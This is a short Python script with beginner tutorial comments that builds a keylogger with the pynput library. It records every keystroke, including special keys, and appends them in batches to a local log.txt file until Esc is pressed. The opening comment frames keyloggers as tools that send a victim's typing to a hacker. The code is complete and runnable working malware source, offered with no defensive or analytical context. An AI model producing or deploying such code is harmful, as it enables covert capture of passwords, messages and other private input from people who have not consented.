# A keylogger is a program that sends your text to the hacker.
# To avoid high processing load, we can use comparison operators in a condition (if) and a list.

from pynput import keyboard

ignore_keys = [keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt]

# Create an empty list called buffer.
# This temporarily stores pressed keys so we can write them all at once later.
buffer = []

# Define a function called on_press that runs every time a key is pressed.
def on_press(key):
    # If the key is in the ignore_keys list, skip it.
    if key in ignore_keys:
        return
    
    # Start of the try block — meaning "try to do this; if an error happens, go to except."
    try:
        # If the key is a letter or number, add it to the buffer list.
        buffer.append(key.char)
    # If an AttributeError occurs (i.e. the key has no char — special keys like Enter, Space), go to this block.
    except AttributeError:
        # Add special keys to the list like [Key.enter], [Key.space], ...
        buffer.append(f"[{key}]")
    
    # Check if the number of items in buffer is 15 or more.
    if len(buffer) >= 15:
        # Open the file log.txt in append mode. (with) means the file closes automatically.
        with open("log.txt", "a") as f:
            f.write("".join(buffer))
        buffer.clear()

def on_release(key):
    if key == keyboard.Key.esc:
        if buffer:
            with open("log.txt", "a") as f:
                f.write("".join(buffer))
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()